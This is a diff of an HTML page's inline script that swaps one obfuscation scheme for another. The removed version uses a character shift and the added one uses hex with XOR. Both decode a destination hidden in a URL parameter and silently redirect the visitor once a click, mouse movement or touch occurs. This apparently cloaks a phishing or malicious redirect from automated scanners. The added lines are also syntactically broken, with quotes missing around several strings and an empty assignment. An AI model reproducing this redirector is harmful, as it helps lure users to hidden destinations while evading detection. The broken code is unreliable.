@@ -33,16 +33,16 @@ p{margin-bottom:16px;font-size:1.02em}
 </div>
 <script>
 (function(){
-var k=7,s=location.search,p=new URLSearchParams(s),c=p.get("d");
-if(!c)return;
-function x(e){for(var o="",i=0;i<e.length;i++)o+=String.fromCharCode(e.charCodeAt(i)-k);return o}
-var q=x(c),done=0;
-function go(){if(!done){done=1;location.replace(q)}}
-document.getElementById("g").onclick=function(){go()};
-var f=0;
-function t(){if(!f){f=1;setTimeout(go,700)}}
-document.addEventListener("mousemove",t,{once:1});
-document.addEventListener("touchstart",t,{once:1});
+var p=new URLSearchParams(location.search),h=p.get(d);
+if(!h)return;
+var k=parseInt(p.get(k)||42),r=;
+for(var i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16)^k);
+var done=0;
+function go(){if(!done){done=1;location.replace(r)}}
+document.getElementById(g).onclick=function(){go()};
+var f=0;function t(){if(!f){f=1;setTimeout(go,600)}}
+document.addEventListener(mousemove,t,{once:1});
+document.addEventListener(touchstart,t,{once:1});
 })();
 </script>
 </body>
